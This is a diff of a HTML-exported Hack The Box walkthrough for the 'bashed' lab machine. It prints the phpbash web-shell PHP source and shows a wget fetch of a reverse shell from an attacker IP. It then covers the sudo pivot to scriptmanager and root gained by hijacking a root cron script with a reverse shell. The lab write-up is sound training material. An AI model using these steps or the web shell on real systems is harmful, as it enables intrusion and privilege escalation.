@@ -5,39 +5,86 @@
   <meta name="generator" content="CherryTree">
   <link rel="stylesheet" href="styles.css" type="text/css" />
 </head>
-<body><div class="main"><div class="tree">
+<body><div class="main", id="top"><div class="tree">
 <p><a href="../HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
-<p><a href="HacktheBox--Linux_Boxes--bashed.html">bashed</a></p>
+<p><a href="#bashed">bashed</a></p>
 
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--bashed--nmap.html">nmap</a></li>
-<li><a href="HacktheBox--Linux_Boxes--bashed--phpbash_github.html">phpbash github</a></li>
+<li><a href="#nmap">nmap</a></li>
+<li><a href="#phpbash github">phpbash github</a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--bashed--phpbash_github--phpbash.php_source_code.html">phpbash.php source code</a></li>
+<li><a href="#phpbash.php source code">phpbash.php source code</a></li>
 </ol>
-<li><a href="HacktheBox--Linux_Boxes--bashed--http.html">http</a></li>
+<li><a href="#http">http</a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--bashed--http--gobuster.html">gobuster</a></li>
+<li><a href="#gobuster">gobuster</a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--bashed--http--gobuster--dev-phpbash.min.php.html">dev/phpbash.min.php</a></li>
+<li><a href="#dev/phpbash.min.php">dev/phpbash.min.php</a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--bashed--http--gobuster--dev-phpbash.min.php--foothold_calling_back_reverse_shell_with_php.rev.html">foothold calling back reverse shell with php.rev</a></li>
+<li><a href="#foothold calling back reverse shell with php.rev">foothold calling back reverse shell with php.rev</a></li>
 </ol>
 </ol>
 </ol>
-<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_scriptmanager.html">priv esc to scriptmanager</a></li>
-<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_root.html">priv esc to root</a></li>
+<li><a href="#priv esc to scriptmanager">priv esc to scriptmanager</a></li>
+<li><a href="#priv esc to root">priv esc to root</a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_root--Linux_smart_enumeration.html">Linux smart enumeration</a></li>
+<li><a href="#Linux smart enumeration">Linux smart enumeration</a></li>
 <ol>
-<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_root--Linux_smart_enumeration--upload_lse.sh.html">upload lse.sh</a></li>
-<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_root--Linux_smart_enumeration--lse_report.html">lse report</a></li>
+<li><a href="#upload lse.sh">upload lse.sh</a></li>
+<li><a href="#lse report">lse report</a></li>
 </ol>
-<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_root--test.py_cron_job.html">test.py cron job</a></li>
-<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_root--reverse_shell.html">reverse shell</a></li>
+<li><a href="#test.py cron job">test.py cron job</a></li>
+<li><a href="#reverse shell">reverse shell</a></li>
 </ol>
-<li><a href="HacktheBox--Linux_Boxes--bashed--user-root.html">user/root</a></li>
-<li><a href="HacktheBox--Linux_Boxes--bashed--lessons_learned.html">lessons learned</a></li>
-</ol></div>
-<div class="page"><h1><b><u>bashed</u></b></h1><img src="images/1-1.png" alt="images/1-1.png" /><br /><img src="images/1-2.png" alt="images/1-2.png" /></div></div>
-</body></html>
+<li><a href="#user/root">user/root</a></li>
+<li><a href="#lessons learned">lessons learned</a></li>
+
+
+</ol>
+</div>
+<div class="page", id="bashed"><h1><b><u>bashed</u></b></h1><img src="images/1-1.png" alt="images/1-1.png" /><br /><img src="images/1-2.png" alt="images/1-2.png" /></div>
+
+<div class="page", id ="nmap"><h1><b><u>nmap</u></b></h1><img src="images/2-1.png" alt="images/2-1.png" /><br /><span style="color:#24ff00;">only service running is </span><span style="color:#ffa500;">http</span></div>
+<div class="page", id ="phpbash github"><h1><b><u>phpbash github</u></b></h1><img src="images/34-1.png" alt="images/34-1.png" /><br /><br /><img src="images/34-2.png" alt="images/34-2.png" /></div>
+
+<div class="page", id ="phpbash.php source code"><h1><b><u>phpbash.php source code</u></b></h1><div class="codebox"><div style="background-color:#001b33" class="clear_fix">&lt;?php<br /><span style="color:#ff9d00;font-weight:700">/</span>*&nbsp;phpbash&nbsp;by&nbsp;Alexander&nbsp;Reid&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Arrexel<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;*<span style="color:#ff9d00;font-weight:700">/</span><br /><span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ISSET<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_POST</span>[<span style="color:#3ad900;font-weight:400">'cmd'</span>]<span style="color:#ff9d00;font-weight:700">))</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">$output</span>&nbsp;=&nbsp;preg_split<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'/[\n]/'</span>,&nbsp;shell_exec<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_POST</span>[<span style="color:#3ad900;font-weight:400">'cmd'</span>].<span style="color:#3ad900;font-weight:400">"&nbsp;2&gt;&amp;1"</span><span style="color:#ff9d00;font-weight:700">));</span><br />&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$output</span>&nbsp;as&nbsp;<span style="color:#7f0044;font-weight:400">$line</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;htmlentities<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$line</span>,&nbsp;ENT_QUOTES&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ENT_HTML5,&nbsp;<span style="color:#3ad900;font-weight:400">'UTF-8'</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&lt;br&gt;"</span><span style="color:#ff9d00;font-weight:700">;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">}</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ffdd00;font-weight:400">die()</span><span style="color:#ff9d00;font-weight:700">;</span>&nbsp;<br /><span style="color:#ff9d00;font-weight:700">}</span>&nbsp;<span style="color:#ff9d00;font-weight:700">else</span>&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(!</span>empty<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_FILES</span>[<span style="color:#3ad900;font-weight:400">'file'</span>][<span style="color:#3ad900;font-weight:400">'tmp_name'</span>]<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">&amp;&amp;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">!</span>empty<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_POST</span>[<span style="color:#3ad900;font-weight:400">'path'</span>]<span style="color:#ff9d00;font-weight:700">))</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">$filename</span>&nbsp;=&nbsp;<span style="color:#7f0044;font-weight:400">$_FILES</span>[<span style="color:#3ad900;font-weight:400">"file"</span>][<span style="color:#3ad900;font-weight:400">"name"</span>]<span style="color:#ff9d00;font-weight:700">;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">$path</span>&nbsp;=&nbsp;<span style="color:#7f0044;font-weight:400">$_POST</span>[<span style="color:#3ad900;font-weight:400">'path'</span>]<span style="color:#ff9d00;font-weight:700">;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$path</span>&nbsp;<span style="color:#ff9d00;font-weight:700">!</span>=&nbsp;<span style="color:#3ad900;font-weight:400">"/"</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">$path</span>&nbsp;.=&nbsp;<span style="color:#3ad900;font-weight:400">"/"</span><span style="color:#ff9d00;font-weight:700">;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">}</span>&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>move_uploaded_file<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_FILES</span>[<span style="color:#3ad900;font-weight:400">"file"</span>][<span style="color:#3ad900;font-weight:400">"tmp_name"</span>],&nbsp;<span style="color:#7f0044;font-weight:400">$path</span>.<span style="color:#7f0044;font-weight:400">$filename</span><span style="color:#ff9d00;font-weight:700">))</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;htmlentities<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$filename</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;successfully&nbsp;uploaded&nbsp;to&nbsp;"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;htmlentities<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$path</span><span style="color:#ff9d00;font-weight:700">);</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">}</span>&nbsp;<span style="color:#ff9d00;font-weight:700">else</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Error&nbsp;uploading&nbsp;"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;htmlentities<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$filename</span><span style="color:#ff9d00;font-weight:700">);</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">}</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ffdd00;font-weight:400">die()</span><span style="color:#ff9d00;font-weight:700">;</span><br /><span style="color:#ff9d00;font-weight:700">}</span><br />?&gt;</div></div></div>
+
+<div class="page", id="http"><h1><b><u>http</u></b></h1><img src="images/2030-1.png" alt="images/2030-1.png" /><br /><img src="images/2030-2.png" alt="images/2030-2.png" /></div>
+
+<div class="page", id="gobuster"><h1><b><u>gobuster</u></b></h1><img src="images/31-1.png" alt="images/31-1.png" /></div>
+
+<div class="page", id="dev/phpbash.min.php"><h1><b><u>dev/phpbash.min.php</u></b></h1><img src="images/32-1.png" alt="images/32-1.png" /><br /><br /><span style="color:#24ff00;"><br />checking out </span><span style="color:#ffa500;">phpbash.php</span><span style="color:#24ff00;">, we see that the webserver spawns an interactive shell for us to play around with! however, it is slightly limited if we look back at the </span><span style="color:#ffa500;">phpbash.php </span><span style="color:#24ff00;">source code, so lets call a shell back to our attack machine so we can work with a fully functional shell</span><br /><img src="images/32-2.png" alt="images/32-2.png" /><br /><br /></div>
+
+<div class="page", id="foothold calling back reverse shell with php.rev"><h1><b><u>foothold calling back reverse shell with php.rev</u></b></h1><span style="color:#24ff00;">since the server is coded in </span><span style="color:#ffa500;">php</span><span style="color:#24ff00;">, it makes sense to choose a reverse shell written in </span><span style="color:#ffa500;">php</span><span style="color:#24ff00;">, we can find one on pentestmonkey</span><br /><img src="images/33-1.png" alt="images/33-1.png" /><br /><br /><span style="color:#24ff00;">next set these parameters in your</span><span style="color:#ffa500;"> rev.php</span><span style="color:#24ff00;"> file to call back to your </span><span style="color:#ffff00;">ip</span><span style="color:#24ff00;"> and </span><span style="color:#ffff00;">port</span><br /><img src="images/33-2.png" alt="images/33-2.png" /><br /><img src="images/33-3.png" alt="images/33-3.png" /><br /><br /><span style="color:#24ff00;">next serve up an</span><span style="color:#ffff00;"> http server </span><span style="color:#24ff00;">on your attack machine and download it to your victim via </span><span style="color:#ffa500;">wget</span><br /><span style="color:#ffa500;">wget 10.10.14.62/rev.php</span><br /><img src="images/33-4.png" alt="images/33-4.png" /><br /><img src="images/33-5.png" alt="images/33-5.png" /><br /><br /><br /><span style="color:#24ff00;">finally, navigate to your downloaded php script on bashed's /upload/ directory, set up a listener and voila!</span><br /><img src="images/33-6.png" alt="images/33-6.png" /><br /><br /><span style="color:#24ff00;">we popped a shell and got a </span><span style="color:#ffff00;">foothold</span><span style="color:#24ff00;"> on the box!</span><br /><img src="images/33-7.png" alt="images/33-7.png" /><br /><br /><span style="color:#24ff00;">lets spawn an interactive shell with <br /></span><span style="color:#ffa500;">python -c ‘import pty;pty.spawn("/bin/bash")’</span><br /><img src="images/33-8.png" alt="images/33-8.png" /><br /></div>
+
+<div class="page", id="priv esc to scriptmanager"><h1><b><u>priv esc to scriptmanager</u></b></h1><span style="color:#24ff00;">running</span><span style="color:#ffa500;"> sudo -l </span><span style="color:#24ff00;">to check what scripts we can run as root without a password we see:</span><br /><img src="images/35-1.png" alt="images/35-1.png" /><br /><br /><span style="color:#24ff00;">we don't need a password for scriptmanager, let switch to his account</span><br /><br /><span style="color:#24ff00;">run sudo -u scriptmanager with bash spawn argument:</span><br /><span style="color:#ffa500;">sudo -u scriptmanager /bin/bash</span><br /><img src="images/35-2.png" alt="images/35-2.png" /></div>
+
+<div class="page", id="priv esc to root"><h1><b><u>priv esc to root</u></b></h1><span style="color:#24ff00;">notice scripts is owned by scriptmanager<br /><br /></span><img src="images/36-1.png" alt="images/36-1.png" /><br /></div>
+
+
+<div class="page", id="Linux smart enumeration"><h1><b><u>Linux smart enumeration</u></b></h1><span style="color:#24ff00;">its always good habit to run a privilege escalation script to catch anything that may otherwise be hard to spot,<br />a favorite of mine is</span><span style="color:#ffa500;"> lse.sh (linux smart enumeration) </span><span style="color:#24ff00;">because its report is very easy to follow and comprehend</span><br /><br /><img src="images/2032-1.png" alt="images/2032-1.png" /><br /><img src="images/2032-2.png" alt="images/2032-2.png" /><br /><br /><span style="color:#24ff00;">if you don't have it I highlt recommend downloading it to your </span><span style="color:#ffa500;">/opt</span><span style="color:#24ff00;"> folder</span><br /><img src="images/2032-3.png" alt="images/2032-3.png" /><br /><br /><img src="images/2032-4.png" alt="images/2032-4.png" /><br /><br /><img src="images/2032-5.png" alt="images/2032-5.png" /></div>
+
+<div class="page", id="upload lse.sh"><h1><b><u>upload lse.sh</u></b></h1><span style="color:#24ff00;">lets spin up an http server with <span style="color:#ffa500;">python -m SimpleHTTPServer &lt;port&gt; </span><br /><br /><img src="images/2033-1.png" alt="images/2033-1.png" /><br /><br />and download it to our victim box with wget</h2><br /><img src="images/2033-2.png" alt="images/2033-2.png" /><br /><br /><span style="color:#ffa500;">chmod -x lse.sh</span> to make it executable and run it with bash or <span style="color:#ffa500;">./ </span><br /></span><img src="images/2033-3.png" alt="images/2033-3.png" /><br /><br /><br /></div>
+
+<div class="page", id="lse report"><h1><b><u>lse report</u></b></h1><span style="color:#24ff00;">lets use -level 1 to output some interesting finds to document, skip passed the password prompt since we don't know scriptmanager's password<br /><br /><span style="color:#ffa500;">lse.sh -l 1 </span></s><br /><br />according to the report, there is a sessionclean script that runs every minute but we unfortunately cannot read what it does, lets keep it in mind and move on</h2><br /><img src="images/2034-1.png" alt="images/2034-1.png" /><br /><br />the report also indicates that the cron jobs are all run with root permissions, this indicates we can most likely exploit it to gain root privilieges if we can overwrite or hijack a script that the sessionclean cron job uses<br /><img src="images/2034-2.png" alt="images/2034-2.png" /><br /><br /><br />we see also from the report we can write to few files that may be worth looking into, lets check out the scripts folder<br /><img src="images/2034-3.png" alt="images/2034-3.png" /></span></div>
+
+
+<div class="page", id="test.py cron job"><h1><b><u>test.py cron job</u></b></h1><span style="color:#24ff00;">test.py has got to be a </span><span style="color:#ffa500;">cron job</span><span style="color:#24ff00;"> that updates itself </span><span style="color:#ffff00;">every minute</span><span style="color:#24ff00;">, its also owned by root! This is our ticket in....</span><br /><br /><img src="images/37-1.png" alt="images/37-1.png" /><br /><img src="images/37-2.png" alt="images/37-2.png" /><br /><br /><span style="color:#24ff00;">we notice that</span><span style="color:#ffa500;"> test.txt</span><span style="color:#24ff00;"> was updated a minutes ago!</span><br /><br /><br /><span style="color:#24ff00;">lets see what</span><span style="color:#ffa500;"> test.py</span><span style="color:#24ff00;"> does</span><br /><img src="images/37-3.png" alt="images/37-3.png" /><br /><br /><span style="color:#24ff00;">we see that test.txt is outputted</span><br /><img src="images/37-4.png" alt="images/37-4.png" /><br /><br /><span style="color:#24ff00;">it has become overabundantely clear that since scriptmanager owns test.py and root runs test.py every MINUTE, we can easily </span><span style="color:#ffff00;">hijack</span><span style="color:#24ff00;"> test.py to run a reverse shell in python to call back to our attack machine and simply wait a minute for root's cron job to execute it with root privileges back to us<br /></span><br /></div>
+
+<div class="page", id="reverse shell"><h1><b><u>reverse shell</u></b></h1><span style="color:#24ff00;">Lets use pentest monkey's python script to connect back to our attacking machine every time it executes</span><br /><img src="images/38-1.png" alt="images/38-1.png" /><br /><span style="color:#24ff00;">simply tweak </span><img src="images/38-2.png" alt="images/38-2.png" /> to call back to your own ip and port of your choosing<br /><br /><br /><img src="images/38-3.png" alt="images/38-3.png" /><br /><br /><br /><span style="color:#24ff00;">Lets use wget to download our reverse shell and run it on our victim machine:<br /></span><img src="images/38-4.png" alt="images/38-4.png" /><br /><br /><span style="color:#24ff00;">Lets also rename our</span> <span style="color:#ffa500;">rev_shell.py</span><span style="color:#24ff00;"> to </span><span style="color:#ffa500;">test.py</span>, <span style="color:#24ff00;">hijacking</span><span style="color:#ffa500;"> test.py</span><span style="color:#24ff00;"> so it will be run every minute as root</span><br /><img src="images/38-5.png" alt="images/38-5.png" /><br /><br /><span style="color:#24ff00;">when test.py executes on the minute we will spawn a shell as root and officially own the box!</span><br /><img src="images/38-6.png" alt="images/38-6.png" /><br /><br /></div>
+
+<div class="page", id= "user/root"><h1><b><u>user/root</u></b></h1><img src="images/40-1.png" alt="images/40-1.png" /><br /><br /><img src="images/40-2.png" alt="images/40-2.png" /></div>
+
+
+<div class="page", id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br /><br /><img src="images/1954-1.png" alt="images/1954-1.png" /></div>
+
+</div></div>
+
+
+</body>
+
+
+
+
+
+</html>
